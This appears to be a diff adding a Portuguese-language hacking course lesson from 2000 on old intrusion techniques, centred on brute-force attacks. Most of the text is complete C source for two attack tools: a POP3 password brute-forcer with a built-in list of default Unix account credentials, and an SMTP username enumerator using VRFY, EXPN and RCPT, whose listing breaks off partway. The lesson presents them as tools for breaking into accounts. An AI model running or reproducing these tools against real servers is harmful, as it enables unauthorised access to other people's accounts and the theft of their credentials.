@@ -1,0 +1,1243 @@
+###########################################################################
+########################### UNSEKURITY SCENE ##############################
+###########################################################################
+
+
+                        CURSO BASICO DE HACKING
+
+                                AULA III
+
+
+Desenvolvido por Nash Leon.
+nashleon@yahoo.com.br
+16/12/2000
+
+* INDICE *
+
+Tecnicas Antigas de Invasao(II Parte)
+
+
+* Tecnicas Antigas de Invasao (II Parte)
+
+Enumerar as diversas tecnicas de invasao eh algo muito trabalhoso.Dezenas
+de hackers contemplavam as tecnicas muito antes delas se concretizarem,
+era sempre uma teoria a espera de um hacker e da criacao de novos recursos
+para a sua implementacao! Foi neste cenario que algumas das tecnicas
+antigas serviram de "preludio" para algumas mais atuais! Se antes era
+comum encontrar redes usando NFS para compartilhar arquivos e diretorios
+remotamente, as coisas foram ficando cada vez mais dificeis e aos poucos
+a seguranca das redes ia aumentando.As permissoes de arquivos no mundo
+UNIX jah era um fato e mesmo antes do surgimento do "shadow" para
+auxiliar a seguranca do arquivo de senhas de um passwd, alguns
+administradores de rede jah procuravam dificultar as coisas usando
+ferramentas que logavam atividades em um sistema! Muito antes de se
+popularizar a tecnica hoje conhecida como "TTY-LOG", as ferramentas de
+LOG jah exerciam seus papeis.
+
+Uma das tecnicas mais antigas que se tem noticia eh a tecnica de Brutal
+Force, onde atraves de sucessivas tentativas, um atacante procura obter
+acesso a alguma conta valida no sistema!Eu havia falado algo sobre ela na
+aula passada, mas agora nos iremos ver alguns exemplos e de fato entrar
+no conceito.Um daemon ou servico remoto que gera algum tipo de autenticacao
+pode perfeitamente ser alvo desta tecnica.Um atacante pode conseguir
+privilegios em cima de uma conta qualquer e usa-la para conseguir cada
+vez mais, maiores privilegios.Varios servicos efetuam autenticacao e
+alguns deles nem se quer setam o numero maximo de tentativas de autenticacao
+por numero de conexoes!
+
+Abaixo podemos contemplar o uso de alguns exploits que procuram efetuar
+ataques do tipo brutal force(Para um melhor entendimento de alguns
+conceitos envolvendo Brutal Forces, recomendo a leitura do meu texto 
+"IMPLEMENTACOES BASICAS DE BRUTAL FORCES" que pode ser obtido na pagina
+da Unsekurity Scene):
+
+* Brutal Force p/ POP:
+
+
+  /**************************************************************************/
+  /*     Titulo : verify.c                                                  */
+  /*     Versao : 1.42b                                                     */
+  /*     Autor  : Bradock                                                   */
+  /*     E-mail : bradock@usa.net                                           */
+  /*     Data   : 19/10/1997                                                */
+  /*     Descricao:  Este programa foi desenvolvido por bradock e tem       */
+  /*                 a intensao de "catar" senhas em servidores.            */
+  /*                 Existem quatro modos de verificacao das senhas:        */
+  /*               * Primeiro Modo: -1                                      */
+  /*                 Verifica os passwd's default's dos sistemas unix       */
+  /*                 sintaxe: bash# verify pop.nasa.org -1                  */
+  /*               * Segundo Modo: -2                                       */
+  /*                 Verifica manuamente o login de um usuario tendo        */
+  /*                 como base de tentativas:                               */
+  /*                       login = (nulo)                                   */
+  /*                       login = senha                                    */
+  /*                       login = senha invertida                          */
+  /*                       sintaxe: bash# verify pop.nasa.org -2 login      */
+  /*               * Terceiro Metodo: -3                                    */
+  /*                 Verifica do mesmo modo que o segundo metodo, so        */
+  /*                 que tendo como base de tentativas um arquivo de logins.*/
+  /*                 sintaxe: bash# verify pop.nasa.org -3 loginfile.dic    */
+  /*               * Quarto Metodo: -4                                      */
+  /*                 Neste metodo ele vai verificar um arquivo de logins e  */
+  /*                 juntamente com uma wordlist                            */
+  /*                 sintaxe: bash# verify pop.nasa.org -4 logins.txt words */
+  /*               * Quinto Metodo: -5                                      */
+  /*                 Esse metodo e o mais complexo porem mais demorado      */
+  /*                 ele vai verificar no servidor os logins agora como     */
+  /*                 base de tentivas o arquivo de login e o arquivo de     */
+  /*                 wordlist e ainda por cima como no metodo -2            */
+  /*                                                                        */
+  /*    -> AtUaLiZaCoES <-                                                  */
+  /*                                                                        */
+  /*   Versao 1.4:                                                          */
+  /*  1) Adicionado a porcentagem para vc ter uma nocao de quanto tempo     */
+  /*     falta para terminar as tentativas                                  */
+  /*  2) Adicionado a opcao de recuperacao segura caso o programa trave ou  */
+  /*     ocorra uma desconexao do servidor permitindo que vc tente mais tarde*/
+  /*     continuando de onde vc havia parado.                               */
+  /**************************************************************************/
+
+
+                /***  Para Compilar digite:****/
+                /* gcc -o verify verify.c  ou */
+                /* cc  -o verify verify.c     */
+                /******************************/
+
+  #include <sys/param.h>
+  #include <sys/socket.h>
+  #include <netinet/in.h>
+
+  #include <stdio.h>
+  #include <string.h>
+  #include <signal.h>
+  #include <unistd.h>
+  #include <netdb.h>
+  #include <stdarg.h>
+  #include <termios.h>
+
+  #define TRUE 1
+  #define FALSE !TRUE
+
+  #define DEFAULT_PORT 110
+  #define VERSION "1.42b"
+  #define _DEBUG_
+
+  #define SERVER_PATH "server.log"
+  #define VERIFY_PATH "verify.log"
+  #define VERIFY_TMP "/tmp/verify.tmp"
+
+  #define VERIFY_HACK_DEFAULT 0
+  #define VERIFY_HACK_LOGIN   1
+  #define VERIFY_HACK_DICT    2
+  #define VERIFY_HACK_BRUTE   3
+
+  struct verify_type
+   {
+     char hostname[1024];  /* hostname                       */
+     int verify_mode;      /* Tipo do ataque                 */
+     int yo;               /* HackDefault Number             */
+     char userfile[1024];  /* Nome do arquivo de usuario     */
+     char wordfile[1024];  /* Nome do arquivo de wordlist    */
+     long curpos_userfile; /* Posicao no arquivo do user     */
+     long curpos_wordfile; /* Posicao no arquivo de wordlist */
+     int calc_atual;       /* Calculo de Porcentagem         */
+     int percent_total;    /* Calculo de Porcentagem         */
+     int percent_atual;    /* Calculo de Porcentagem         */
+   } verify;
+
+  void start (void);
+  int conecta (char *server, int port);
+  void reconnect (void);
+  int verifica (char *username, char *password);
+  char *getanswer (char *buff);
+  void reverse (char *str1, char *str2);
+  void get_status (FILE *fp);
+  void write_sets (FILE *fp);
+  void print_status (void);
+  int file_exist (char *filename);
+  int handler (int unused);
+  void getkey (char *key);
+  int hack_login (char *username);
+  void hack_default (int inicio);
+  void hack_ldicts (char *filename);
+  void hack_dict (char *loginfile, char *pwdfile);
+  void hack_brute_dict (char *loginfile, char *pwdfile);
+  void end (void);
+
+
+ FILE *pop, *server_log, *pass_file = NULL;
+ FILE *username_file, *wordfile = NULL;
+ int connect_sock;
+ int error = FALSE;
+ int restart = FALSE;
+
+ char *login[] =
+   {
+   "root", "root", "root","root",
+   "bin","bin",
+   "daemon", "daemon",
+   "adm", "adm", "adm",
+   "admin", "admin", "admin",
+   "lp", "lp",
+   "sync", "sync",
+   "shutdown", "shutdown",
+   "halt", "halt",
+   "mail", "mail",
+   "news", "news",
+   "uucp", "uucp",
+   "tty", "tty",
+   "operator", "operator",
+   "games", "games", "games",
+   "man", "man",
+    "sysman", "sysman", "sysman", "sysman",
+    "postmaster", "postmaster",
+    "nobody", "nobody",
+    "ftp", "ftp",
+    "guest", "guest",
+    "sys", "sys", "sys",
+    "test", "test",
+    "unix", "unix", "unix",
+    "sysadmin", "sysadmin", "sysadmin", "sysadmin", "sysadmin", "sysadmin",
+    "who", "who",
+    "leran", "learn",
+    "uuhost", "uuhost",
+    "host", "host",
+    "nuucp", "nuucp",
+    "rje", "rje",
+    "sysop", "sysop",
+    "demo","demo"
+   };
+
+    char *passwd[] =
+   {
+     "\0", "root", "system", "sysop",
+     "\0", "bin",
+     "\0", "daemon",
+     "\0", "adm", "admin", "\0", "adm", "admin",
+     "\0", "lp", "\0", "sync",
+     "\0", "shutdown", "\0", "halt", "\0", "mail", "\0", "news",
+     "\0", "uucp", "\0", "tty", "\0", "operator", "\0", "games", "player",
+     "\0", "man", "\0", "sys", "sysman", "system", "\0", "postmaster",
+     "\0", "nobody", "\0", "ftp", "\0", "guest", "\0", "sys", "system",
+     "\0", "test", "\0", "unix", "test", "\0", "sysadmin", "sys", "system",
+     "admin", "adm", "\0", "who", "\0", "learn", "\0", "uuhost", "\0", "host",
+     "\0", "nuucp", "\0", "rje" , "\0", "sysop", "\0", "demo"
+     };
+
+void start (void)
+{
+   FILE *fp = NULL;
+   char ch[2];
+
+   if(file_exist(VERIFY_TMP) == TRUE)
+     {
+       printf("A ultima tentativa nao foi terminada com sucesso\n");
+       printf("Deseja continuar de onde parou?(S\\n):");
+
+       getkey(ch);
+       printf("\n");
+
+       if(!strcmp(ch, "S") || !strcmp(ch, "s"))
+        {
+           signal(SIGINT, handler);
+           restart = TRUE;
+           fp = fopen(VERIFY_TMP, "rb");
+           if(fp == NULL)
+             {
+               fprintf(stderr, "Erro: Abrindo %s\n", VERIFY_TMP);
+               exit(-1);
+             }
+           fread(&verify, sizeof(verify), 1, fp);
+           fclose(fp);
+
+         if((server_log=fopen(SERVER_PATH, "a")) == NULL)
+           fprintf(stderr, "Erro: Gravando o arquivo %s\n", SERVER_PATH);
+         if((pass_file=fopen(VERIFY_PATH, "a")) == NULL)
+           fprintf(stderr, "Erro: Gravando o arquivo %s\n", VERIFY_PATH);
+
+               switch(verify.verify_mode)
+                 {
+                   case VERIFY_HACK_DEFAULT:
+                   printf("Recomecando [ hack_default(%d) ]\n", verify.yo);
+                   hack_default(verify.yo);
+                   break;
+                   case VERIFY_HACK_LOGIN:
+                   printf("Recomecando [ hack_ldicts(%s) ]\n", verify.userfile);
+                   hack_ldicts(verify.userfile);
+                   break;
+                   case VERIFY_HACK_DICT:
+                   printf("Recomecando [ hack_dict(%s, %s) ]\n", verify.userfile, verify.wordfile);
+                   hack_dict(verify.userfile, verify.wordfile);
+                   break;
+                   case VERIFY_HACK_BRUTE:
+                   printf("Recomecando [ hack_brute_dict(%s, %s) ]\n", verify.userfile, verify.wordfile);
+                   hack_brute_dict(verify.userfile, verify.wordfile);
+                   break;
+                   default:
+                   fprintf(stderr, "Erro: Modo de ataque desconhecido\n");
+                   exit(-1);
+                   break;
+                 }
+           unlink(VERIFY_TMP);
+           end();
+           printf("Done. Please check file logs!\n");
+           exit(0);
+        }
+ }
+     if((server_log=fopen(SERVER_PATH, "w+")) == NULL)
+        fprintf(stderr, "Erro: Gravando o arquivo %s\n", SERVER_PATH);
+     if((pass_file=fopen(VERIFY_PATH, "w+")) == NULL)
+        fprintf(stderr, "Erro: Gravando o arquivo %s\n", VERIFY_PATH);
+
+}
+
+ int conecta (char *server, int port)
+  {
+   char tmp[100];
+   struct sockaddr_in sin;
+   struct hostent *hp;
+
+
+   hp=gethostbyname(server);
+   if(hp==NULL) return FALSE;
+
+   bzero((char *)&sin,sizeof(sin));
+   bcopy(hp->h_addr,(char *)&sin.sin_addr,hp->h_length);
+   sin.sin_family = AF_INET;
+   sin.sin_port   = htons(port);
+   connect_sock   = socket(AF_INET, SOCK_STREAM, 0);
+   if(connect(connect_sock,(struct sockaddr *)&sin,sizeof(sin))<0) return FALSE;
+
+   pop = fdopen(connect_sock, "rt");
+   if(pop == NULL) return FALSE;
+   getanswer(tmp);
+   fprintf(server_log, "%s\n", tmp);
+
+   return TRUE;
+  }
+
+
+void reconnect (void)
+{
+ char buff[12];
+
+  strcpy(buff, "QUIT\n");
+  send(connect_sock, buff, strlen(buff), 0);
+  close(connect_sock);
+
+   if(conecta(verify.hostname, DEFAULT_PORT) == FALSE)
+   {
+     fprintf(stderr, "Erro: Nao foi possivel reconectar a %s\n", verify.hostname);
+     error = TRUE;
+     end();
+     exit(-1);
+   }
+ }
+
+int verifica (char *username, char *password)
+{
+   char buff[512];
+
+   sprintf(buff, "USER %s\n", username);
+   send(connect_sock, buff, strlen(buff), 0);
+   fprintf(server_log, "%s", buff);
+   getanswer(buff);
+   fprintf(server_log, buff);
+   fprintf(server_log, "\n");
+
+   bzero((char *)&buff, sizeof(buff));
+   sprintf(buff, "PASS %s\n", password);
+   send(connect_sock, buff, strlen(buff), 0);
+   fprintf(server_log, "%s", buff);
+   getanswer(buff);
+   fprintf(server_log, buff);
+   fprintf(server_log, "\n");
+   fflush(server_log);
+
+   if(strstr(buff, "+OK") != NULL)
+     {
+      fprintf(stdout, "USERNAME: %s\nPASSWORD: %s\n\n", username, password);
+      fprintf(pass_file, "USERNAME: %s\nPASSWORD: %s\n\n", username, password);
+      fflush(pass_file);
+      reconnect();
+      return TRUE;
+     }
+   else {
+    reconnect();
+    return FALSE;
+  }
+}
+
+char *getanswer (char *buff)
+{
+   int ch;
+   char *in=buff;
+
+    for(;;)
+     {
+      while(TRUE)
+       {
+         ch=fgetc(pop);
+         if(ch == '\n')
+            {
+              *in='\0';
+               break;
+             }
+            else
+             {
+               *in=(char)ch;
+                in++;
+             }
+
+       }
+          if(strstr(buff, "+OK") != NULL) return buff;
+          if(strstr(buff, "-ERR") != NULL) return buff;
+     }
+}
+
+void reverse (char *str1, char *str2)
+ {
+     int length, i;
+
+     length = strlen(str1);
+
+     for(i = 0; i < length; i++)
+        str2[i] = (&str1[length-i]) [-1];
+        str2[length] = '\0';
+}
+
+
+void get_status (FILE *fp)
+{
+  unsigned char tmp[50];
+
+  printf("Carregando logins um momento ...\n");
+  while(!feof(fp))
+    {
+      bzero((char *)&tmp, sizeof(tmp));
+      if(fgets(tmp, 13, fp) == NULL) break;
+      verify.percent_total++;
+    }
+
+   printf("Status:\n");
+   printf("Total de Logins: %d\n", verify.percent_total);
+   printf("Iniciando processo ...\n\n");
+   if(verify.verify_mode = VERIFY_HACK_BRUTE) verify.percent_total++;
+   print_status();
+   fseek(fp, 0, SEEK_SET);
+}
+
+void write_sets (FILE *fp)
+{
+    switch(verify.verify_mode)
+      {
+        case VERIFY_HACK_LOGIN:
+        verify.curpos_userfile = ftell(username_file);
+        break;
+        case VERIFY_HACK_DICT:
+        verify.curpos_userfile = ftell(username_file);
+        verify.curpos_wordfile = ftell(wordfile);
+        break;
+        case VERIFY_HACK_BRUTE:
+        verify.curpos_userfile = ftell(username_file);
+        verify.curpos_wordfile = ftell(wordfile);
+        break;
+      }
+    fwrite(&verify, sizeof(verify), 1, fp);
+ }
+
+void print_status (void)
+{
+  if(verify.percent_total > 0)
+  verify.percent_atual = (int)((verify.calc_atual * 100) / verify.percent_total);
+       else verify.percent_atual = 0;
+  printf("%d%%\n", verify.percent_atual);
+  verify.calc_atual++;
+}
+
+int file_exist(char *filename)
+{
+  FILE *fp;
+  int result;
+
+  if((fp=fopen(filename, "rt")) == NULL)
+              result = FALSE;
+                   else result = TRUE;
+  fclose(fp);
+  return(result);
+}
+
+int handler (int unused)
+ {
+   FILE *fp = NULL;
+
+   printf("CTRL+C Pressionado! Saindo...\n");
+   if((fp=fopen(VERIFY_TMP, "wb+")) == NULL)
+        fprintf(stderr, "Erro: Gravando em %s\n", VERIFY_TMP);
+         else
+           {
+              write_sets(fp);
+              fclose(fp);
+            }
+   end();
+   exit(-1);
+   return(0);
+ }
+
+void getkey (char *key)
+{
+ static struct termios old, new;
+
+  tcgetattr(fileno(stdin), &old);
+  memcpy(&new, &old, sizeof(struct termios));
+  new.c_lflag &= ~(ICANON|ECHO);
+  tcsetattr(fileno(stdin), TCSANOW, &new);
+  fgets(key, 2, stdin);
+  tcsetattr(fileno(stdin), TCSANOW, &old);
+}
+
+ int hack_login (char *username)
+ {
+   char pass[12];
+   int result = FALSE;
+
+   if(!username)  return FALSE;
+
+   strcpy(pass, "\0");
+   result = verifica(username, pass);
+   if(result == TRUE) return result;
+
+   strcpy(pass, username);
+   result = verifica(username, pass);
+   if(result == TRUE) return result;
+
+   reverse(username, pass);
+   result = verifica(username, pass);
+
+   return result;
+ }
+
+void hack_default (int inicio)
+{
+  unsigned char tmp[12];
+  verify.percent_total = 77;
+
+  verify.verify_mode = VERIFY_HACK_DEFAULT;
+
+  if(inicio < 0 || inicio > verify.percent_total) inicio = 0;
+
+  for(verify.yo=inicio; verify.yo < 78; verify.yo++)
+   {
+     if(strcmp(login[verify.yo], tmp)) {
+     print_status();
+     if(verifica(login[verify.yo], passwd[verify.yo]) == TRUE)
+          {
+           strcpy(tmp, login[verify.yo]);
+          }
+      }
+   }
+}
+
+void hack_ldicts (char *filename)
+{
+ char *tmp;
+ unsigned char login_atual[12];
+
+ if((username_file=fopen(filename, "rt")) == NULL)
+    {
+      fprintf(stderr, "Erro: Abrindo arquivo %s \n", filename);
+      end();
+      exit(-1);
+    }
+
+ if(restart == TRUE)
+  {
+  fseek(username_file, verify.curpos_userfile, SEEK_SET);
+  } else {
+    strcpy(verify.userfile, filename);
+    get_status(username_file);
+  }
+
+ verify.verify_mode = VERIFY_HACK_LOGIN;
+ while(!feof(username_file))
+  {
+  bzero((char *)&login_atual, sizeof(login_atual));
+  if(fgets(login_atual, 12, username_file) == NULL) break;
+   tmp=strchr(login_atual, 10);
+   if(tmp!=NULL) *tmp=0;
+  if(login_atual[0]) {
+    print_status();
+    hack_login(login_atual);
+    }
+  }
+ fclose(username_file);
+}
+
+void hack_dict (char *loginfile, char *pwdfile)
+{
+  char *tmp;
+  unsigned char login_atual[12], pwd_atual[12];
+  int fim = FALSE;
+  int final_pwd = FALSE;
+
+
+  if((username_file=fopen(loginfile, "rt")) == NULL) {
+    fprintf(stderr, "Erro: Nao foi possivel abrir %s \n", loginfile);
+    end();
+    exit(-1);
+    }
+  if((wordfile=fopen(pwdfile, "rt")) == NULL) {
+   fprintf(stderr, "Erro: Nao foi possivel abrir %s \n", pwdfile);
+   end();
+   exit(-1);
+  }
+
+
+  if(restart == TRUE)
+   {
+     fseek(username_file, verify.curpos_userfile, SEEK_SET);
+     fseek(wordfile, verify.curpos_wordfile, SEEK_SET);
+   } else {
+     strcpy(verify.userfile, loginfile);
+     strcpy(verify.wordfile, pwdfile);
+     get_status(username_file);
+   }
+
+ verify.verify_mode = VERIFY_HACK_DICT;
+ while(!feof(username_file))
+  {
+    if(final_pwd == TRUE || feof(wordfile)) fseek(wordfile, 0, SEEK_SET);
+    bzero((char *)&login_atual, sizeof(login_atual));
+    if(
+      fgets(login_atual, 13, username_file) == NULL
+      ) break;
+
+      tmp=strchr(login_atual, 10);
+      if(tmp!=NULL) *tmp=0;
+      print_status();
+
+     for(;;)
+      {
+       if(
+       fgets(pwd_atual, 13, wordfile) == NULL
+         ) { final_pwd = TRUE; break; }
+          fim = verifica(login_atual, pwd_atual);
+          if(fim == TRUE) { fim = FALSE; fseek(wordfile, 0, SEEK_SET); break; }
+      }
+  }
+}
+
+void hack_brute_dict (char *loginfile, char *pwdfile)
+{
+  char *tmp;
+  unsigned char login_atual[12], pwd_atual[12];
+  int fim = FALSE;
+  int final_pwd = FALSE;
+
+  if((username_file=fopen(loginfile, "rt")) == NULL) {
+    fprintf(stderr, "Erro: Nao foi possivel abrir %s \n", loginfile);
+    end();
+    exit(-1);
+    }
+  if((wordfile=fopen(pwdfile, "rt")) == NULL) {
+   fprintf(stderr, "Erro: Nao foi possivel abrir %s \n", pwdfile);
+   end();
+   exit(-1);
+  }
+
+
+  if(restart == TRUE)
+   {
+     fseek(username_file, verify.curpos_userfile, SEEK_SET);
+     fseek(wordfile, verify.curpos_wordfile, SEEK_SET);
+   } else {
+     strcpy(verify.userfile, loginfile);
+     strcpy(verify.wordfile, pwdfile);
+     get_status(username_file);
+   }
+
+ verify.verify_mode = VERIFY_HACK_BRUTE;
+ while(!feof(username_file))
+  {
+    if(final_pwd == TRUE || feof(wordfile)) fseek(wordfile, 0, SEEK_SET);
+    bzero((char *)&login_atual, sizeof(login_atual));
+    if(
+      fgets(login_atual, 13, username_file) == NULL
+      ) break;
+
+      tmp=strchr(login_atual, 10);
+      if(tmp!=NULL) *tmp=0;
+      print_status();
+
+     for(;;)
+      {
+       if(
+       fgets(pwd_atual, 13, wordfile) == NULL
+         ) { final_pwd = TRUE; break; }
+          fim = verifica(login_atual, pwd_atual);
+          if(fim == FALSE)
+          fim = hack_login(login_atual);
+          if(fim == TRUE)
+                     {
+                       fim = FALSE;
+                       fseek(wordfile, 0, SEEK_SET);
+                       break;
+                    }
+      }
+  }
+}
+
+
+void end (void)
+{
+ FILE *fp = NULL;
+
+  close(connect_sock);
+  fclose(pop);
+  fclose(server_log);
+  fclose(pass_file);
+  if(error == TRUE)
+    {
+   if((fp=fopen(VERIFY_TMP, "wb+")) == NULL)
+       {
+         fprintf(stderr, "Erro: Gravando %s\n", VERIFY_TMP);
+       } else
+    {
+     write_sets(fp);
+     fclose(fp);
+    }
+  }
+}
+
+main (int argc, char *argv[])
+{
+  printf("\n              Verify Versao %s \n", VERSION);
+  printf("                By Br4d0ck (bradock@usa.net)\n\n");
+  if(argc <= 1) {
+  printf("Sintaxe: %s servidor [opcao] [argumento]  \n", argv[0]);
+  printf("servidor : Servidor que deseja fazer a tentativa \n");
+  printf("opcao    : Os modos de verificao o default eh -1 \n");
+  printf("argumento: O argumento adcional que cada opcao requer \n");
+  printf("\n Exemplos : \n %s nasa.org \n %s nasa.org -2 rogger \n", argv[0], argv[0]);
+  printf("para maiores informacoes digite -h ou -?\n");
+  return(0);
+  }
+  if(!strcmp(argv[1], "-h") || !strcmp(argv[1], "-?"))
+    {
+      printf("Verify foi desenvolvido por Bradock (bradock@usa.net)\n");
+      printf("Este programa verifica se o server especificado atraves\n");
+      printf("de opcoes tem passwd's respectivos ao que vc deseja saber.\n\n");
+      printf("                 [[Opcoes]]\n\n");
+      printf("-1 ( default ): Verifica os passwd's default do sistema unix\n");
+      printf("    Sintaxe : %s server -1\n", argv[0]);
+      printf("-2: Verifica manualmente um login\n");
+      printf("    Sintaxe : %s server -2 login\n", argv[0]);
+      printf("-3: Verifica com uma lista de logins\n");
+      printf("    Sintaxe : %s server -3 loginfile.txt\n", argv[0]);
+      printf("-4: Verifica com uma lista de logins e uma wordlist\n");
+      printf("    Sintaxe:%s server -4 loginfile.txt wordlist.dic\n", argv[0]);
+      printf("-5: Enquadra todos os metodos \n");
+      printf("    Sintaxe: %s server -5 loginfile.txt wordlist.dic\n\n", argv[0]);
+      printf("Have a Phun !!!\n\n");
+      return(0);
+    }
+
+  strcpy(verify.hostname, argv[1]);
+  start();
+  signal(SIGINT,&handler);
+
+ if(conecta(verify.hostname, DEFAULT_PORT) == FALSE)
+  {
+    fprintf(stderr, "Nao foi possivel conectar a %s \n", argv[1]);
+    return(-1);
+  }
+   printf("Conectado a [%s] : %d \n", verify.hostname, DEFAULT_PORT);
+   fprintf(pass_file, "Verify Versao %s \nBy Br4d0ck (bradock@usa.net)\n\n%s :\n", VERSION, verify.hostname);
+
+ for(;;)
+  {
+  if(argv[2])
+   {
+    if(!strcmp(argv[2], "-2")) { hack_login(argv[3]); break; }
+    if(!strcmp(argv[2], "-3")) { hack_ldicts(argv[3]); break; }
+    if(!strcmp(argv[2], "-4")) { hack_dict(argv[3], argv[4]); break; }
+    if(!strcmp(argv[2], "-5")) { hack_brute_dict(argv[3], argv[4]); break; }
+   }
+  hack_default(0); break;
+  }
+    end();
+    printf("Done. Please check file logs!\n");
+
+ return(0);
+}
+
+--------------------------------------------------------------------------
+
+* Brutal Force p/ Sendmail:
+
+--------------------------- smtp-cracker.c -------------------------------
+/*
+ ** Code by:
+ **  Lucas Fontes<lucasfontes@clips.com.br> 
+ **  Nelson Brito<nelson@secunet.com.br || nelson@sekure.org>
+ **
+ ** Cool Sites:
+ **  http://stderr.sekure.org/
+ **  http://www.secunet.de/
+ **  http://www.secunet.com.br/
+ **  http://www.ibqn.com.br/
+ **  http://www.secuREnet.com.br/
+ **
+ ** How to compile(Como compilar):
+ ** 1) Versao Portugues
+ ** machine:~# gcc -Wall -O3 -DPORTUGUES smtp-cracker.c -o smtp-cracker
+ **
+ ** 2) English Version
+ ** machine:~# gcc -Wall -O3 smtp-cracker.c -o smtp-cracker
+ **
+ ** It's our proof-of-concept... Comments?!?! =))
+ */
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <getopt.h>
+#include <netdb.h>
+#include <signal.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <sys/time.h>
+#define  VERSION  "0.2b"
+
+void statit(int tot,int nau){
+     static int a = 0;
+
+     char zoninha[] = { '\\' , '|' , '/' , '-' };
+
+     fprintf(stderr, "status: %d%% %c\r", ((100*nau)/tot), zoninha[a++]);
+     fflush(stderr);
+
+     if(a==4) a = 0;
+}
+
+char usage(char *p, char *v){
+     #ifdef PORTUGUES
+       fprintf(stderr, "SMTP Scanner de usuários v%s - por Lucas & Nelson\n", v
+);
+       fprintf(stderr, "use:     %s [OPÇÕES] [COMANDO]\n", p);
+       fprintf(stderr, "exemplo: %s -h mail.leet.org -i userlist -o leet.txt -v\n\n", p);
+       fprintf(stderr, "OPÇÕES:\n\t -h, --host     Servidor SMTP para testar\n");
+       fprintf(stderr, "\t -i, --infile   lista de possíveis usuários\n");
+       fprintf(stderr, "\t -o, --outfile  arquivo que armazenará os usuários vá
+lidos\n\n");
+       fprintf(stderr, "COMANDO:\n\t -v, --vrfy     use comando VRFY\n");
+       fprintf(stderr, "\t -e, --expn     use comando EXPN\n");
+       fprintf(stderr, "\t -r, --rcpt     use comando RCPT - a nova técnica\n")
+;
+     #else
+       fprintf(stderr, "SMTP's User Scanner v%s - By Lucas & Nelson\n", v);
+       fprintf(stderr, "use:     %s [OPTIONS] [COMMAND]\n", p);
+       fprintf(stderr, "example: %s -h mail.leet.org -i userlist -o leet.txt -v
+\n\n", p);
+       fprintf(stderr, "OPTIONS:\n\t -h, --host     SMTP Server to test\n");
+       fprintf(stderr, "\t -i, --infile   list of possible users\n");
+       fprintf(stderr, "\t -o, --outfile  dump file with valid usernames\n\n");
+       fprintf(stderr, "COMMAND:\n\t -v, --vrfy     use VRFY command\n");
+       fprintf(stderr, "\t -e, --expn     use EXPN command\n");
+       fprintf(stderr, "\t -r, --rcpt     use RCPT command - the new technique\
+n");
+     #endif
+     exit(0);
+}
+
+void u_abort(int s){
+      #ifdef PORTUGUES
+        fprintf(stderr,"\nmatando processo %d... ", getpid());
+        usleep(300000);
+        fprintf(stderr,"morto\n");
+      #else
+        fprintf(stderr,"\nkilling process %d... ", getpid());
+        usleep(300000);
+        fprintf(stderr,"killed\n");
+      #endif
+      exit(0);
+}
+
+int main(int argc, char **argv){
+
+     struct sockaddr_in sin;
+     struct hostent *ph;
+     struct timeval tm_t;
+
+     time_t start, end;
+  
+     int sock;
+     int latual, ltotal, fusers, passed, opt, timer;
+
+     char buff[500], linha[125], comando[125], atualc[125], *roste = NULL;
+     char fake_roste[125];
+
+     fd_set wakeup;
+     FILE *usrin = NULL, *usrout = NULL;
+
+     extern char *optarg;
+     extern int optind;
+
+     struct option opcoes[]={
+          {"host",     1, 0, 'h'},
+          {"infile",   1, 0, 'i'},
+          {"outfile",  1, 0, 'o'},
+          {"vrfy",     0, 0, 'v'},
+          {"expn",     0, 0, 'e'},
+          {"rcpt",     0, 0, 'r'},
+          {0,          0, 0, 0}
+     };
+   
+     latual = ltotal = fusers = opt = 0;
+
+     if (argc != 8) usage(argv[0], VERSION);
+
+     start = time(NULL);
+   
+     signal(SIGHUP, SIG_IGN);
+     signal(SIGINT, u_abort);
+     signal(SIGTERM, u_abort);
+     signal(SIGKILL, u_abort);
+     signal(SIGQUIT, u_abort);
+
+     while((passed=getopt_long(argc, argv, "h:i:o:ver", opcoes, NULL)) != -1)
+         switch(passed){
+             case 'i':
+                  if(!(usrin=fopen(optarg, "r"))){
+                     perror("read");
+                     exit(0);
+                  }
+                  break;
+             case 'o':
+                  if(!(usrout=fopen(optarg, "w"))){
+                     perror("write");
+                     exit(0);
+                  }
+                  break;
+             case 'h':
+                  roste = optarg;
+                  break;
+             case 'v':
+                  opt = 1;
+                  break;
+             case 'e':
+                  opt = 2;
+                  break;
+             case 'r':
+                  opt = 3;
+                  break;
+             default:
+                  printf(".");
+                  break;
+         }
+
+     passed = 0;
+
+     ph=gethostbyname(roste);
+     if(!ph){
+        perror("connect");
+        exit(1);
+     }
+
+     memcpy((char*)&sin.sin_addr, ph->h_addr, ph->h_length);
+
+     sin.sin_family   =   AF_INET;
+     sin.sin_port     =   htons(IPPORT_SMTP);
+     sin.sin_addr     =   *((struct in_addr *)ph->h_addr);
+
+     if((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1){
+        perror("socket");
+        exit(1);
+     }
+
+     if(connect(sock, (struct sockaddr *)&sin, sizeof(sin)) == -1) {
+        perror("connect");
+        exit(1);
+     }
+     
+     #ifdef PORTUGUES
+       printf("conectado a %s\n",roste);
+     #else
+       printf("connected to %s\n",roste);
+     #endif
+   
+     tm_t.tv_sec  =  40; /* timeout to connect */
+     tm_t.tv_usec =  0;
+
+     FD_ZERO(&wakeup);
+     FD_SET(sock, &wakeup);
+
+     if(!select(sock+1, &wakeup, NULL, NULL, &tm_t)){
+        perror("connect");
+        exit(0);
+     }
+   
+     recv(sock, buff, 500, 0);
+     memset(buff, 0, 500);
+
+     while(fgets(linha, 125, usrin)) ltotal++;
+   
+     rewind(usrin);
+
+     #ifdef PORTUGUES
+       fprintf(usrout, "#arquivo de mail para %s\n", ph->h_name); 
+     #else
+       fprintf(usrout, "#mail file for %s\n", ph->h_name);
+     #endif
+
+     switch(opt){
+         case 1:
+              snprintf(atualc, 125, "VRFY");
+              break;
+         case 2:
+              snprintf(atualc, 125, "EXPN");
+              break;
+         case 3:
+              snprintf(fake_roste, 125, "HELO localhost.%s\n", ph->h_name);
+              snprintf(atualc, 125, "RCPT TO:");
+              send(sock, fake_roste, strlen(fake_roste), 0);
+              recv(sock, buff, 600, 0);
+              send(sock,"MAIL FROM: root@localhost\n", 26, 0); //weaken anti-spans
+              recv(sock, buff, 600, 0);
+              memset(buff, 0, 500);
+              break;
+     }
+     
+     #ifdef PORTUGUES
+       printf("usando comando [%s]\n", atualc);
+     #else
+       printf("using [%s] command\n", atualc);
+     #endif
+
+     while(!feof(usrin)){
+         if(!fgets(linha, 125, usrin)) snprintf(linha, 125, "\n");
+         else latual++;
+      
